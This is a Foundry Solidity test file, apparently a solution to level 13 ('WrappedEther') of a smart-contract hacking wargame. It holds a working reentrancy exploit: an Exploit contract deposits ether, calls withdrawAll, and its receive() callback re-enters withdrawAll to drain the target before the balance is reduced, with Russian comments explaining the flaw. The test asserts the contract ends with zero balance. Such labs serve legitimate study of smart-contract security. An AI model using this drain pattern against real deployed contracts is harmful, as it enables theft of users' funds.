// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        Exploit exploit = new Exploit();
        exploit.attack{value: 0.09 ether}(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Exploit {
    // депозит и сразу все выводим
    function attack(WrappedEther instance) payable external {
        instance.deposit{value:msg.value}(address(this));
        instance.withdrawAll();
    }

    // уязвимость в том, что во время вывода withdrawAll сначала вызывается эта функция recieve, а только потом уменьшается баланс. 
    // мы можем в этой же функции опять вызвать вывод, что приведет к повторному выводу до уменьшения баланса
    receive() external payable {
        if (msg.sender.balance > 0) {
            WrappedEther(msg.sender).withdrawAll();
        }
    }
}
